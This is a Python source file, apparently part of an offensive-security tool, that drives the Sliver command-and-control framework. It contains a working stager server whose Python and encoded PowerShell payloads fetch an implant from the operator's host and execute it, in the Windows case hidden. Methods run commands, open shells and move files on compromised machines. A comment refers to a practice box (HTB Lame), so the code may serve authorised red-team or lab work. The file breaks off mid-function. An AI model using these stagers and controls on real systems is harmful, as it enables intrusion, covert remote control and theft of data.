"""Real Sliver C2 connector implementation using sliver-py."""
# ruff: noqa: S608

import json
import logging
import os
import socket
import threading
import time
import urllib.parse
import uuid
from collections.abc import Callable
from datetime import datetime, timedelta
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from typing import Any

from sliver import SliverClient, SliverClientConfig

from ..base import BaseC2Connector
from ..exceptions import (
    AuthenticationError,
    CommandExecutionError,
    ConfigurationError,
    ConnectionError,
    SessionNotFoundError,
)
from ..models import (
    CommandResult,
    DirectoryEntry,
    FileTransferProgress,
    ImplantConfig,
    ImplantInfo,
    InteractiveShell,
    PortForward,
    PortForwardStatus,
    ProcessInfo,
    Screenshot,
    Session,
    SessionStatus,
    StagerDownload,
    StagerListener,
    StagingServer,
)
from .implant import ImplantGenerator

logger = logging.getLogger(__name__)

# Global registry for stager handlers to access their connectors
_stager_handler_registry: dict[str, Any] = {}

# Global cache for pre-generated implants
_implant_cache: dict[str, dict] = {}
_implant_cache_lock = threading.Lock()

# Global tracking for active downloads
_active_downloads = {}
_downloads_lock = threading.Lock()


class StagerHTTPHandler(BaseHTTPRequestHandler):
    """HTTP handler for stager requests."""

    # Store reference to the connector for implant generation
    connector = None
    server_info = None

    # Use HTTP/1.0 for better compatibility with old clients
    protocol_version = "HTTP/1.0"

    def log_message(self, format: str, *args) -> None:
        """Override to use logger instead of stderr."""
        logger.debug(f"Stager request: {format % args}")

    def setup(self) -> None:
        """Called before handle() to initialize the handler."""
        super().setup()
        # Log handler state for debugging
        logger.debug(f"Handler setup - Class: {self.__class__.__name__}")
        logger.debug(f"Handler setup - Connector: {self.__class__.connector}")
        logger.debug(f"Handler setup - Server info: {self.__class__.server_info}")

        # Set socket options for better compatibility with slow networks
        try:
            # Disable Nagle algorithm for immediate packet sending
            self.connection.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            # Set socket timeout to prevent hanging
            self.connection.settimeout(300)  # 5 minutes timeout
        except Exception as e:
            logger.warning(f"Failed to set socket options: {e}")

    def do_GET(self) -> None:
        """Handle GET requests for stager."""
        parsed_path = urllib.parse.urlparse(self.path)
        query_params = urllib.parse.parse_qs(parsed_path.query)

        if parsed_path.path == "/s":
            # Extract OS and architecture from query parameters
            os_type = query_params.get("o", ["unknown"])[0]
            arch = query_params.get("a", ["unknown"])[0]

            logger.info(f"Stager request from {self.client_address[0]} - OS: {os_type}, Arch: {arch}")

            # Generate implant download and execution code
            payload = self._generate_implant_payload(os_type, arch)

            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(payload)))
            self.end_headers()
            self.wfile.write(payload.encode())

        elif parsed_path.path.startswith("/implant/"):
            # Handle implant download requests
            implant_name = parsed_path.path.split("/")[-1]
            logger.info(f"Implant download request: {implant_name} from {self.client_address[0]}")

            # Create download tracking entry
            download_id = f"{self.client_address[0]}:{time.time()}"
            listener_id = getattr(self.__class__, "listener_id", "unknown")

            # Generate real Sliver implant if possible
            # Try to get connector from global registry
            connector = None
            if hasattr(self.__class__, "listener_id"):
                global _stager_handler_registry
                listener_data = _stager_handler_registry.get(self.__class__.listener_id)
                if listener_data:
                    connector = listener_data.get("connector")
                    logger.info(f"Retrieved connector from registry for listener {self.__class__.listener_id}")

            if connector:
                logger.info(f"Attempting to generate real Sliver implant for {implant_name}")
                logger.info(f"Connector type: {type(connector)}")
                logger.info(f"Has _implant_generator: {hasattr(connector, '_implant_generator')}")

                # Run async implant generation in sync context
                import asyncio

                try:
                    # Get or create event loop
                    try:
                        loop = asyncio.get_event_loop()
                        if loop.is_closed():
                            raise RuntimeError("Event loop is closed")
                    except RuntimeError:
                        loop = asyncio.new_event_loop()
                        asyncio.set_event_loop(loop)

                    # Use run_until_complete to execute async function
                    real_implant = loop.run_until_complete(self._generate_real_implant(implant_name))
                    logger.info(f"Generated implant size: {len(real_implant) if real_implant else 0} bytes")
                except Exception as e:
                    logger.error(f"Failed to generate real implant: {e}", exc_info=True)
                    real_implant = self._generate_fallback_implant(implant_name)
            else:
                logger.warning("No connector available, using fallback implant")
                real_implant = self._generate_fallback_implant(implant_name)

            if real_implant:
                # Track download start
                with _downloads_lock:
                    _active_downloads[download_id] = {
                        "client": self.client_address[0],
                        "implant": implant_name,
                        "size": len(real_implant),
                        "transferred": 0,
                        "started": datetime.now(),
                        "status": "downloading",
                        "listener_id": listener_id,
                    }

                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Length", str(len(real_implant)))
                # Add Connection: close for better compatibility with old clients
                self.send_header("Connection", "close")
                self.end_headers()

                # Send in chunks and track progress
                # Use very small chunk size for HTB Lame's slow network
                chunk_size = 1024  # 1KB chunks for extremely slow connections
                try:
                    for i in range(0, len(real_implant), chunk_size):
                        chunk = real_implant[i : i + chunk_size]
                        self.wfile.write(chunk)
                        # Force flush to ensure data is sent immediately
                        self.wfile.flush()

                        # Update progress
                        with _downloads_lock:
                            if download_id in _active_downloads:
                                _active_downloads[download_id]["transferred"] += len(chunk)

                    # Mark as completed
                    with _downloads_lock:
                        if download_id in _active_downloads:
                            _active_downloads[download_id]["status"] = "completed"
                            logger.info(f"Download completed: {implant_name} to {self.client_address[0]}")
                except OSError as e:
                    # Socket-specific error handling
                    with _downloads_lock:
                        if download_id in _active_downloads:
                            _active_downloads[download_id]["status"] = "failed"
                    logger.error(f"Socket error during download: {implant_name} to {self.client_address[0]} - {e}")
                    logger.error(
                        f"Error details: errno={getattr(e, 'errno', 'unknown')}, "
                        f"strerror={getattr(e, 'strerror', 'unknown')}"
                    )
                except Exception as e:
                    # Other errors
                    with _downloads_lock:
                        if download_id in _active_downloads:
                            _active_downloads[download_id]["status"] = "failed"
                    logger.error(
                        f"Download failed: {implant_name} to {self.client_address[0]} - {type(e).__name__}: {e}"
                    )
            else:
                self.send_response(404)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(b"Implant not found")
        else:
            self.send_response(404)
            self.end_headers()

    def _generate_implant_payload(self, os_type: str, arch: str) -> str:
        """Generate payload to download and execute implant.

        Args:
            os_type: Operating system type (linux, windows, darwin)
            arch: Architecture (32, 64)

        Returns:
            Python code to download and execute implant
        """
        # Map architecture to Sliver format
        arch_map = {"32": "386", "64": "amd64", "i686": "386", "x86_64": "amd64"}
        sliver_arch = arch_map.get(arch, arch)

        # Generate implant name based on OS/arch
        implant_name = f"stager_{os_type}_{sliver_arch}"

        # Get server address from class attributes or request
        if hasattr(self.__class__, "server_info") and self.__class__.server_info:
            default_host = self.__class__.server_info
        else:
            default_host = "localhost:80"

        host_header = self.headers.get("Host", default_host)
        host = host_header.split(":")[0]
        port = host_header.split(":")[1] if ":" in host_header else "80"

        # Generate Python payload for implant download and execution
        if os_type == "linux":
            payload = f'''
# Python 2/3 compatibility
try:
    # Python 2
    import urllib2
    urlopen = urllib2.urlopen
    HTTPError = urllib2.HTTPError
    URLError = urllib2.URLError
except ImportError:
    # Python 3
    import urllib.request
    import urllib.error
    urlopen = urllib.request.urlopen
    HTTPError = urllib.error.HTTPError
    URLError = urllib.error.URLError

import os
import tempfile
import subprocess
import platform
import socket
import sys
import time

# Force unbuffered output for immediate display
if sys.version_info[0] == 2:
    # Python 2 - unbuffered output
    try:
        sys.stdout = os.fdopen(sys.stdout.fileno(), 'w', 0)
        sys.stderr = os.fdopen(sys.stderr.fileno(), 'w', 0)
    except:
        pass
    def log(msg):
        """Print with immediate flush for Python 2"""
        print(msg)
        try:
            sys.stdout.flush()
        except:
            pass
else:
    # Python 3 - use flush parameter
    def log(msg):
        """Print with immediate flush for Python 3"""
        print(msg, flush=True)

# Start with visible output
log("[*] Stager starting...")
log("[*] Host: " + socket.gethostname())
log("[*] Platform: " + platform.system() + " " + platform.machine())
log("[*] Python: " + sys.version.split()[0])

# Configuration
TIMEOUT = 10  # seconds
MAX_RETRIES = 3
RETRY_DELAY = 2  # seconds

# Download implant with retries
implant_url = "http://{host}:{port}/implant/{implant_name}"
log("[*] Target URL: " + implant_url)

for attempt in range(MAX_RETRIES):
    try:
        log("[*] Download attempt " + str(attempt + 1) + "/" + str(MAX_RETRIES))
        # Create request with timeout for Python 2.5 compatibility
        import socket as sock
        default_timeout = sock.getdefaulttimeout()
        sock.setdefaulttimeout(TIMEOUT)
        try:
            response = urlopen(implant_url)
            implant_data = response.read()
            sock.setdefaulttimeout(default_timeout)
            size_kb = len(implant_data) / 1024
            log("[+] Downloaded " + str(size_kb) + " KB")
            break
        except HTTPError as e:
            sock.setdefaulttimeout(default_timeout)
            log("[!] HTTP Error " + str(e.code) + ": " + str(e.reason))
            if attempt < MAX_RETRIES - 1:
                log("[*] Retrying in " + str(RETRY_DELAY) + " seconds...")
                time.sleep(RETRY_DELAY)
            else:
                raise
        except URLError as e:
            sock.setdefaulttimeout(default_timeout)
            log("[!] URL Error: " + str(e.reason))
            if attempt < MAX_RETRIES - 1:
                log("[*] Retrying in " + str(RETRY_DELAY) + " seconds...")
                time.sleep(RETRY_DELAY)
            else:
                raise
    except Exception as e:
        if attempt == MAX_RETRIES - 1:
            log("[!] Failed after " + str(MAX_RETRIES) + " attempts")
            log("[!] Error: " + str(e))
            sys.exit(1)

# Save to temp file
try:
    log("[*] Creating temporary file...")
    fd, implant_path = tempfile.mkstemp()
    os.write(fd, implant_data)
    os.close(fd)
    os.chmod(implant_path, 0o755)
    log("[+] Saved to: " + implant_path)
except Exception as e:
    log("[!] Failed to save implant: " + str(e))
    sys.exit(1)

# Execute implant
try:
    log("[*] Executing implant...")
    # Check Python version for compatibility
    if sys.version_info[0] == 2 and sys.version_info[1] < 6:
        # Python 2.5 compatible version
        log("[*] Using Python 2.5 compatible execution")
        proc = subprocess.Popen([implant_path],
                               stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE)
    elif sys.version_info[0] == 2:
        # Python 2.6+ version with preexec_fn
        log("[*] Using Python 2.6+ execution with process group")
        proc = subprocess.Popen([implant_path],
                               stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE,
                               preexec_fn=os.setsid)
    else:
        # Python 3 version
        log("[*] Using Python 3 execution")
        proc = subprocess.Popen([implant_path],
                               stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE,
                               start_new_session=True)
    # Give it a moment to start
    time.sleep(2)  # Increased wait time for slower systems
    # Check if process started successfully
    if proc.poll() is None:
        log("[+] Implant launched successfully (PID: " + str(proc.pid) + ")")
        # Try to read any initial output without blocking
        import select
        if hasattr(select, 'select'):
            # Check if stdout has data available (Unix-like systems)
            readable, _, _ = select.select([proc.stdout], [], [], 0)
            if readable:
                try:
                    initial_output = proc.stdout.read(1024)  # Read up to 1KB
                    if initial_output:
                        log("[*] Initial output: " + initial_output)
                except:
                    pass
    else:
        # Process exited - capture both stdout and stderr
        stdout_data = proc.stdout.read()
        stderr_data = proc.stderr.read()
        log("[!] Implant exited immediately with code: " + str(proc.poll()))
        if stdout_data:
            log("[!] Stdout: " + stdout_data.decode('utf-8', errors='replace').strip())
        if stderr_data:
            log("[!] Stderr: " + stderr_data.decode('utf-8', errors='replace').strip())
        if not stdout_data and not stderr_data:
            log("[!] No output captured from implant")
        # Common exit codes and their meanings
        exit_code = proc.poll()
        if exit_code == 1:
            log("[!] Exit code 1: Configuration or connection error")
            log("[!] The implant may be trying to connect to a C2 server that's not reachable")
        elif exit_code == 127:
            log("[!] Exit code 127: Command not found - incompatible binary")
        elif exit_code == 126:
            log("[!] Exit code 126: Permission denied")
        elif exit_code == -11:
            log("[!] Exit code -11: Segmentation fault")
        # Additional diagnostics
        import os as diag_os
        if diag_os.path.exists(implant_path):
            stat_info = diag_os.stat(implant_path)
            log("[*] Implant file size: " + str(stat_info.st_size) + " bytes")
            log("[*] Implant permissions: " + oct(stat_info.st_mode))
            # Check file type
            try:
                with open(implant_path, 'rb') as f:
                    magic = f.read(4)
                    if magic == b'\x7fELF':
                        log("[*] File type: ELF executable")
                    elif magic[:2] == b'MZ':
                        log("[*] File type: Windows executable")
                    else:
                        log("[*] File type: Unknown (magic: " + repr(magic) + ")")
            except:
                pass
except Exception as e:
    log("[!] Failed to execute implant: " + str(e))
    sys.exit(1)

log("[*] Stager completed")
'''
        elif os_type == "windows":
            # Windows payload (PowerShell)
            payload = f'''
import urllib2
import subprocess
import base64

print("[*] Windows stager executing...")

# PowerShell command to download and execute
ps_cmd = """
$url = "http://{host}:{port}/implant/{implant_name}.exe"
$client = New-Object System.Net.WebClient
$bytes = $client.DownloadData($url)
$path = [System.IO.Path]::GetTempFileName() + ".exe"
[System.IO.File]::WriteAllBytes($path, $bytes)
Start-Process -FilePath $path -WindowStyle Hidden
"""

# Execute via PowerShell
try:
    encoded_cmd = base64.b64encode(ps_cmd.encode('utf-16le')).decode()
    subprocess.Popen(["powershell", "-EncodedCommand", encoded_cmd],
                     stdout=subprocess.PIPE,
                     stderr=subprocess.PIPE)
    print("[+] Windows implant launched")
except Exception as e:
    print("[!] Error: " + str(e))
'''
        else:
            # Fallback for unknown OS
            payload = f"""
import platform
print("[!] Unsupported OS: {os_type}")
print("[*] Platform details: " + platform.platform())
print("[!] Manual implant deployment required")
"""

        return payload

    async def _generate_real_implant(self, implant_name: str) -> bytes | None:
        """Generate a real Sliver implant binary.

        Args:
            implant_name: Name of the implant (e.g., stager_linux_386)

        Returns:
            Sliver implant binary or None if generation fails
        """
        # Parse OS and arch from implant name
        parts = implant_name.split("_")
        if len(parts) < 3:
            logger.error(f"Invalid implant name format: {implant_name}")
            return None

        os_type = parts[1]
        arch = parts[2]

        # Map our architecture names to Sliver's format
        arch_map = {"386": "386", "amd64": "amd64", "x64": "amd64", "x86": "386"}
        sliver_arch = arch_map.get(arch, arch)

        # Try to get connector from global registry
        connector = None
        listener_id = None
        if hasattr(self.__class__, "listener_id"):
            listener_id = self.__class__.listener_id
            global _stager_handler_registry
            listener_data = _stager_handler_registry.get(listener_id)
            if listener_data:
                connector = listener_data.get("connector")

        if not connector:
            logger.error("No connector available from registry")
            return self._generate_fallback_implant(implant_name)

        # Check cache first to avoid asyncio loop issues
        cache_key = f"{listener_id}:{os_type}:{sliver_arch}"
        with _implant_cache_lock:
            if cache_key in _implant_cache:
                logger.info(f"Using cached implant for {cache_key}")
                cached_data = _implant_cache[cache_key]
                return cached_data["data"]

        # If not in cache, we can't generate in HTTP thread due to asyncio loop conflict
        logger.warning(f"No cached implant for {cache_key}, using fallback")
        return self._generate_fallback_implant(implant_name)

    def _generate_fallback_implant(self, implant_name: str) -> bytes:
        """Generate a fallback implant when real generation fails."""
        parts = implant_name.split("_")
        os_type = parts[1] if len(parts) > 1 else "unknown"
        arch = parts[2] if len(parts) > 2 else "unknown"

        if os_type == "linux":
            # Fallback Linux payload that attempts to connect back
            # Get host info from headers or class attributes
            host_info = "unknown"
            if hasattr(self, "headers") and self.headers:
                host_info = self.headers.get("Host", "unknown")

            script = f"""#!/bin/sh
echo "[*] Sliver implant loader (FALLBACK MODE)"
echo "[*] Platform: Linux {arch}"
echo "[!] Real Sliver implant generation failed"
echo "[!] This is a fallback script, not a real implant"
echo ""
echo "Possible reasons for fallback:"
echo "  1. Sliver C2 server not connected"
echo "  2. Implant generator not available"
echo "  3. Failed to generate implant for Linux/{arch}"
echo ""
echo "To fix this issue:"
echo "  1. Ensure Sliver C2 server is running"
echo "  2. Check wish is connected to Sliver"
echo "  3. Verify implant generation permissions"
echo ""
echo "[*] Requested from: {host_info}"
echo "[*] Expected implant: {implant_name}"
"""
            return script.encode()
        else:
            return b"Fallback implant - real Sliver generation failed"


class RealSliverConnector(BaseC2Connector):
    """Real Sliver C2 connector using gRPC communication."""

    # Class variable to store active HTTP servers
    _active_servers: dict[str, tuple[HTTPServer, threading.Thread]] = {}

    def __init__(self, config_path: Path, ssl_options: dict | None = None):
        """Initialize real Sliver connector.

        Args:
            config_path: Path to Sliver client configuration file
            ssl_options: SSL configuration options:
                - skip_verify: Skip SSL certificate verification (default: False)
                - ca_cert_path: Custom CA certificate path
                - target_name_override: Override SSL target name
        """
        super().__init__()
        self.config_path = config_path
        self.client: SliverClient | None = None
        self._config: dict | None = None
        self.ssl_options = ssl_options or {}
        self._port_forwards: dict[str, PortForward] = {}
        self._implant_generator: ImplantGenerator | None = None

        # Check environment variables for SSL options
        if "WISH_C2_SLIVER_SKIP_VERIFY" in os.environ:
            self.ssl_options["skip_verify"] = os.environ["WISH_C2_SLIVER_SKIP_VERIFY"].lower() == "true"
        if "WISH_C2_SLIVER_CA_CERT" in os.environ:
            self.ssl_options["ca_cert_path"] = os.environ["WISH_C2_SLIVER_CA_CERT"]

    def _create_sliver_client(self, config: SliverClientConfig) -> SliverClient:
        """Create Sliver client with appropriate SSL configuration.

        Args:
            config: Sliver client configuration

        Returns:
            Configured SliverClient instance
        """
        # Handle SSL certificate verification options
        if self.ssl_options.get("skip_verify", False):
            # WARNING: This disables SSL verification - only for development!
            # Note: sliver-py might not directly support ssl_context parameter
            # This is a conceptual implementation that may need adjustment
            # based on actual sliver-py API
            logger.warning("Creating client with SSL verification disabled")

        elif self.ssl_options.get("ca_cert_path"):
            # Use custom CA certificate
            ca_cert_path = self.ssl_options["ca_cert_path"]
            logger.info(f"Using custom CA certificate: {ca_cert_path}")

        # For now, create standard client - SSL options will be handled
        # through environment variables or sliver-py configuration
        return SliverClient(config)

    async def connect(self) -> bool:
        """Connect to Sliver C2 server.

        Returns:
            True if connection successful

        Raises:
            ConfigurationError: If config file is invalid
            AuthenticationError: If authentication fails
            ConnectionError: If connection fails
        """
        try:
            logger.info(f"Loading Sliver config from {self.config_path}")

            # Load and validate config
            if not self.config_path.exists():
                raise ConfigurationError(f"Config file not found: {self.config_path}")

            # sliver-py expects path for parse_config_file
            config = SliverClientConfig.parse_config_file(str(self.config_path))

            # Create client with SSL options
            self.client = self._create_sliver_client(config)

            # Connect to server
            logger.info(f"Connecting to Sliver server at {config.lhost}:{config.lport}")
            if self.ssl_options.get("skip_verify", False):
                logger.warning(
                    "⚠️  SSL certificate verification is disabled. "
                    "This is insecure and should only be used in development!"
                )
            await self.client.connect()

            # Store connection info
            self.server = f"{config.lhost}:{config.lport}"
            self.connected = True

            # Initialize implant generator
            self._implant_generator = ImplantGenerator(self.client)

            logger.info("Successfully connected to Sliver C2 server")
            return True

        except FileNotFoundError as e:
            raise ConfigurationError(f"Config file error: {e}") from e
        except PermissionError as e:
            raise ConfigurationError(f"Permission denied reading config: {e}") from e
        except json.JSONDecodeError as e:
            raise ConfigurationError(f"Invalid config file format: {e}") from e
        except Exception as e:
            # Check for common connection errors
            error_msg = str(e).lower()
            if "auth" in error_msg or "certificate" in error_msg:
                raise AuthenticationError(f"Authentication failed: {e}") from e
            elif "timeout" in error_msg or "unavailable" in error_msg:
                raise ConnectionError(f"Failed to connect to Sliver server: {e}") from e
            else:
                raise ConnectionError(f"Connection error: {e}") from e

    async def disconnect(self) -> None:
        """Disconnect from C2 server."""
        if self.client:
            try:
                # Note: sliver-py doesn't have a close() method
                # Just clear the client reference
                pass
            except Exception as e:
                logger.warning(f"Error during disconnect: {e}")
            finally:
                self.client = None
                self.connected = False
                logger.info("Disconnected from Sliver C2 server")

    async def get_sessions(self) -> list[Session]:
        """Get list of active sessions.

        Returns:
            List of active sessions

        Raises:
            ConnectionError: If not connected
        """
        if not self.connected or not self.client:
            raise ConnectionError("Not connected to Sliver C2")

        try:
            # Get sessions from Sliver
            sliver_sessions = await self.client.sessions()

            # Sort sessions for consistent ordering
            # Primary: Put remote hosts (non-localhost) first
            # Secondary: Sort by IP address
            # Tertiary: Sort by ID for stable ordering
            def sort_key(s):
                # Extract IP from RemoteAddress (format: "IP:port")
                ip = s.RemoteAddress.split(":")[0] if ":" in s.RemoteAddress else s.RemoteAddress
                # Check if it's localhost/local network
                is_local = ip.startswith("10.") or ip.startswith("127.") or ip == "localhost"
                # Return tuple: (is_local, ip, ID)
                # is_local=False (remote) comes before is_local=True (local)
                return (is_local, ip, s.ID)

            sorted_sessions = sorted(sliver_sessions, key=sort_key)

            sessions = []
            for s in sorted_sessions:
                # Map Sliver session to our Session model
                session = Session(
                    id=s.ID,
                    name=s.Name,
                    host=s.RemoteAddress.split(":")[0] if ":" in s.RemoteAddress else s.RemoteAddress,
                    os=s.OS.lower(),
                    arch=s.Arch,
                    user=s.Username,
                    pid=s.PID,
                    status=SessionStatus.ACTIVE if s.IsDead is False else SessionStatus.DISCONNECTED,
                    last_checkin=datetime.fromtimestamp(s.LastCheckin / 1_000_000_000),  # nanoseconds to seconds
                )
                sessions.append(session)

            return sessions

        except Exception as e:
            logger.error(f"Failed to get sessions: {e}")
            raise ConnectionError(f"Failed to retrieve sessions: {e}") from e

    async def execute_command(self, session_id: str, command: str) -> CommandResult:
        """Execute command in session.

        Args:
            session_id: Session ID or name
            command: Command to execute

        Returns:
            Command execution result

        Raises:
            SessionNotFoundError: If session not found
            CommandExecutionError: If command execution fails
        """
        if not self.connected or not self.client:
            raise ConnectionError("Not connected to Sliver C2")

        try:
            # Get session
            session = await self._get_session_by_id_or_name(session_id)
            if not session:
                raise SessionNotFoundError(f"Session '{session_id}' not found")

            # Execute command using interact_session
            logger.debug(f"Executing command in session {session.Name}: {command}")
            interaction = await self.client.interact_session(session.ID)

            # Parse command into exe and args
            # For complex shell commands (containing &&, ||, ;, |, etc.),
            # we need to run them through a shell
            shell_chars = ["&&", "||", ";", "|", ">", "<", ">>", "<<", "&"]
            needs_shell = any(char in command for char in shell_chars)

            if needs_shell:
                # Execute through shell
                exe = "/bin/sh"
                args = ["-c", command]
            else:
                # Split the command string - first element is the executable, rest are arguments
                parts = command.split()
                if not parts:
                    raise CommandExecutionError("Empty command")
                exe = parts[0]
                args = parts[1:] if len(parts) > 1 else []

            # Execute with proper arguments
            result = await interaction.execute(exe, args)

            # Convert result
            return CommandResult(
                stdout=result.Stdout.decode("utf-8", errors="replace") if result.Stdout else "",
                stderr=result.Stderr.decode("utf-8", errors="replace") if result.Stderr else "",
                exit_code=result.Status,
            )

        except SessionNotFoundError:
            raise
        except TimeoutError as e:
            raise CommandExecutionError(f"Command timed out: {command}") from e
        except Exception as e:
            logger.error(f"Command execution failed: {e}")
            raise CommandExecutionError(f"Failed to execute command: {e}") from e

    async def start_interactive_shell(self, session_id: str) -> InteractiveShell:
        """Start interactive shell session.

        Args:
            session_id: Session ID or name

        Returns:
            Interactive shell instance

        Raises:
            SessionNotFoundError: If session not found
        """
        if not self.connected or not self.client:
            raise ConnectionError("Not connected to Sliver C2")

        # Get session
        session = await self._get_session_by_id_or_name(session_id)
        if not session:
            raise SessionNotFoundError(f"Session '{session_id}' not found")

        # Convert to our Session model
        our_session = Session(
            id=session.ID,
            name=session.Name,
            host=session.RemoteAddress.split(":")[0] if ":" in session.RemoteAddress else session.RemoteAddress,
            os=session.OS.lower(),
            arch=session.Arch,
            user=session.Username,
            pid=session.PID,
            status=SessionStatus.ACTIVE,
            last_checkin=datetime.now(),
        )

        return RealInteractiveShell(self, our_session)

    async def _get_session_by_id_or_name(self, session_ref: str) -> Any | None:
        """Get session by ID or name.

        Args:
            session_ref: Session ID or name

        Returns:
            Sliver session object or None
        """
        try:
            if not self.client:
                return None
            sessions = await self.client.sessions()
            if sessions:
                for session in sessions:
                    if session.ID == session_ref or session.Name == session_ref:
                        return session
                    # Also check if session_ref is a prefix of ID
                    if session.ID.startswith(session_ref):
                        return session
            return None
        except Exception as e:
            logger.error(f"Failed to lookup session: {e}")
            return None

    async def upload_file(
        self,
        session_id: str,
        local_path: Path,
        remote_path: str,
        progress_callback: Callable[[FileTransferProgress], None] | None = None,
    ) -> bool:
        """Upload file to remote system via Sliver.

        Args:
            session_id: Session ID or name
            local_path: Local file path
            remote_path: Remote destination path
            progress_callback: Optional callback for progress updates

        Returns:
            True if successful

        Raises:
            ConnectionError: If not connected
            SessionNotFoundError: If session not found
            FileNotFoundError: If local file not found
            CommandExecutionError: If upload fails
        """
        if not self.connected or not self.client:
            raise ConnectionError("Not connected to Sliver C2")

        if not local_path.exists():
            raise FileNotFoundError(f"Local file not found: {local_path}")

        # Get session
        session = await self._get_session_by_id_or_name(session_id)
        if not session:
            raise SessionNotFoundError(f"Session '{session_id}' not found")

        try:
            # Read file
            file_size = local_path.stat().st_size
            transfer_id = str(uuid.uuid4())

            # Create progress tracker
            progress = FileTransferProgress(
                transfer_id=transfer_id,
                filename=local_path.name,
                total_bytes=file_size,
                transferred_bytes=0,
                transfer_rate=0.0,
                is_upload=True,
                started_at=datetime.now(),
            )

            logger.info(f"Uploading {local_path} to {remote_path} ({file_size} bytes)")

            # Read file in chunks for progress tracking
            chunk_size = 1024 * 1024  # 1MB chunks
            with open(local_path, "rb") as f:
                data = bytearray()
                start_time = datetime.now()

                while True:
                    chunk = f.read(chunk_size)
                    if not chunk:
                        break

                    data.extend(chunk)
                    progress.transferred_bytes += len(chunk)

                    # Calculate transfer rate
                    elapsed = (datetime.now() - start_time).total_seconds()
                    if elapsed > 0:
                        progress.transfer_rate = progress.transferred_bytes / elapsed

                    # Update progress
                    if progress_callback:
                        progress_callback(progress)

            # Upload via Sliver
            await self.client.upload(session.ID, remote_path, bytes(data))

            logger.info(f"Upload completed: {local_path} -> {remote_path}")
            return True

        except Exception as e:
            logger.error(f"File upload failed: {e}")
            raise CommandExecutionError(f"Failed to upload file: {e}") from e

    async def download_file(
        self,
        session_id: str,
        remote_path: str,
        local_path: Path,
        progress_callback: Callable[[FileTransferProgress], None] | None = None,
    ) -> bool:
        """Download file from remote system via Sliver.

        Args:
            session_id: Session ID or name
            remote_path: Remote file path
            local_path: Local destination path
            progress_callback: Optional callback for progress updates

        Returns:
            True if successful

        Raises:
            ConnectionError: If not connected
            SessionNotFoundError: If session not found
            CommandExecutionError: If download fails
        """
        if not self.connected or not self.client:
            raise ConnectionError("Not connected to Sliver C2")

        # Get session
        session = await self._get_session_by_id_or_name(session_id)
        if not session:
            raise SessionNotFoundError(f"Session '{session_id}' not found")

        try:
            # Create parent directory if needed
            local_path.parent.mkdir(parents=True, exist_ok=True)

            logger.info(f"Downloading {remote_path} to {local_path}")

            # Download via Sliver
            data = await self.client.download(session.ID, remote_path)

            if not data:
                raise CommandExecutionError(f"No data received for {remote_path}")

            # Create progress tracker
            transfer_id = str(uuid.uuid4())
            progress = FileTransferProgress(
                transfer_id=transfer_id,
                filename=Path(remote_path).name,
                total_bytes=len(data),
                transferred_bytes=0,
                transfer_rate=0.0,
                is_upload=False,
                started_at=datetime.now(),
            )

            # Write file in chunks for progress tracking
            chunk_size = 1024 * 1024  # 1MB chunks
            start_time = datetime.now()

            with open(local_path, "wb") as f:
                for i in range(0, len(data), chunk_size):
                    chunk = data[i : i + chunk_size]
                    f.write(chunk)

                    progress.transferred_bytes += len(chunk)

                    # Calculate transfer rate
                    elapsed = (datetime.now() - start_time).total_seconds()
                    if elapsed > 0:
                        progress.transfer_rate = progress.transferred_bytes / elapsed

                    # Update progress
                    if progress_callback:
                        progress_callback(progress)

            logger.info(f"Download completed: {remote_path} -> {local_path}")
            return True

        except Exception as e:
            logger.error(f"File download failed: {e}")
            raise CommandExecutionError(f"Failed to download file: {e}") from e

    async def list_directory(self, session_id: str, path: str) -> list[DirectoryEntry]:
        """List directory contents on remote system.

        Args:
            session_id: Session ID or name
            path: Directory path

        Returns:
            List of directory entries

        Raises:
            ConnectionError: If not connected
            SessionNotFoundError: If session not found
            CommandExecutionError: If listing fails
        """
        if not self.connected or not self.client:
            raise ConnectionError("Not connected to Sliver C2")

        # Get session
        session = await self._get_session_by_id_or_name(session_id)
        if not session:
            raise SessionNotFoundError(f"Session '{session_id}' not found")

        try:
            # Get session interaction
            interaction = await self.client.interact_session(session.ID)

            # Use ls command to list directory
            result = await interaction.execute("ls", ["-la", path])

            if result.Status != 0:
                raise CommandExecutionError(f"Failed to list directory: {result.Stderr.decode('utf-8')}")

            # Parse ls output
            entries = []
            lines = result.Stdout.decode("utf-8").strip().split("\n")

            # Skip total line
            for line in lines[1:]:
                parts = line.split(None, 8)
                if len(parts) >= 9:
                    # Parse permissions, size, date, name
                    mode = parts[0]
                    # Parse owner and group
                    owner = parts[2]
                    group = parts[3]
                    size = int(parts[4]) if parts[4].isdigit() else 0

                    # Parse date/time - ls -la format varies:
                    # Recent files: "Nov 14 12:30"
                    # Older files: "Nov 14  2023"
                    month_str = parts[5]
                    day_str = parts[6]
                    time_or_year = parts[7]
                    name = parts[8]

                    # Skip . and ..
                    if name in [".", ".."]:
                        continue

                    # Parse modification time
                    modified_at = self._parse_ls_date(month_str, day_str, time_or_year)

                    is_dir = mode.startswith("d")
                    full_path = f"{path.rstrip('/')}/{name}"

                    entry = DirectoryEntry(
                        name=name,
                        path=full_path,
                        size=size,
                        mode=mode,
                        is_dir=is_dir,
                        modified_at=modified_at,
                        owner=owner,
                        group=group,
                    )
                    entries.append(entry)

            return entries

        except Exception as e:
            logger.error(f"Directory listing failed: {e}")
            raise CommandExecutionError(f"Failed to list directory: {e}") from e

    def _parse_ls_date(self, month: str, day: str, time_or_year: str) -> datetime:
        """Parse date from ls -la output.

        Args:
            month: Month name (e.g., "Nov")
            day: Day of month
            time_or_year: Either time (HH:MM) or year (YYYY)

        Returns:
            Parsed datetime
        """
        import calendar
        from datetime import datetime

        try:
            # Get month number
            month_num = list(calendar.month_abbr).index(month)
            day_num = int(day)

            # Check if it's time or year
            if ":" in time_or_year:
                # Recent file with time
                hour, minute = map(int, time_or_year.split(":"))
                # Assume current year
                now = datetime.now()
                result = datetime(now.year, month_num, day_num, hour, minute)

                # If date is in future, it's probably last year
                if result > now:
                    result = result.replace(year=now.year - 1)
            else:
                # Older file with year
                year = int(time_or_year)
                result = datetime(year, month_num, day_num)

            return result

        except (ValueError, IndexError) as e:
